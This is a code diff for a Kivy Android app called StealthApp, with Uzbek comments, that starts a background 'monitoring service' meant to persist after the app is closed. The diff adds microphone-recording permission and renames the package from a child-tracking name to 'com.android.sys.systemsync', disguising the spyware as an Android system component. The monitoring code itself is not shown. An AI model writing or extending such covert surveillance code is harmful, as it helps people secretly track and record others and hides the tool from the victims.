@@ -5,8 +5,6 @@ from kivy.utils import platform
 
 class StealthApp(App):
     def build(self):
-        # Bu qism faqat ruxsatlarni so'rash va xizmatni ishga tushirish uchun qisqa vaqt ochiladi.
-        # Ruxsat olingandan keyin ilova orqa fonga o'tadi yoki yopilsa ham service ishlayveradi.
         if platform == 'android':
             from android.permissions import request_permissions, Permission
             request_permissions([
@@ -15,28 +13,33 @@ class StealthApp(App):
                 Permission.FOREGROUND_SERVICE,
                 Permission.WAKE_LOCK,
                 Permission.WRITE_EXTERNAL_STORAGE,
-                Permission.READ_EXTERNAL_STORAGE
+                Permission.READ_EXTERNAL_STORAGE,
+                Permission.RECORD_AUDIO,
             ])
             self.start_foreground_service()
-            
+
         layout = BoxLayout(orientation='vertical')
-        layout.add_widget(Label(text="Kuzatuv xizmati faollashdi.\nIlovani yopishingiz mumkin (Orqa fonda ishlaydi)."))
+        layout.add_widget(Label(
+            text="Kuzatuv xizmati faollashdi.\nIlovani yopishingiz mumkin\n(Orqa fonda ishlaydi)."
+        ))
         return layout
 
     def start_foreground_service(self):
-        from jnius import autoclass
-        mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
-        # Xizmat nomini buildozer.spec da qanday nomlasak, shunday yozamiz
-        service_name = "org.childtracking.bot.ServiceStealth" 
-        context = mActivity.getApplicationContext()
-        service_class = autoclass(service_name)
-        intent = autoclass('android.content.Intent')(context, service_class)
-        intent.putExtra("pythonServiceArgument", "")
-        # Android O dan boshlab Foreground Service sifatida ishga tushirish
-        if autoclass('android.os.Build$VERSION').SDK_INT >= 26:
-            mActivity.startForegroundService(intent)
-        else:
-            mActivity.startService(intent)
+        try:
+            from jnius import autoclass
+            mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
+            # buildozer.spec: package.domain=com.android.sys, package.name=systemsync, services=worker:...
+            service_name = "com.android.sys.systemsync.ServiceWorker"
+            context = mActivity.getApplicationContext()
+            service_class = autoclass(service_name)
+            intent = autoclass('android.content.Intent')(context, service_class)
+            intent.putExtra("pythonServiceArgument", "")
+            if autoclass('android.os.Build$VERSION').SDK_INT >= 26:
+                mActivity.startForegroundService(intent)
+            else:
+                mActivity.startService(intent)
+        except Exception as e:
+            print(f"Xizmatni ishga tushirishda xatolik: {e}")
 
 if __name__ == '__main__':
     StealthApp().run()
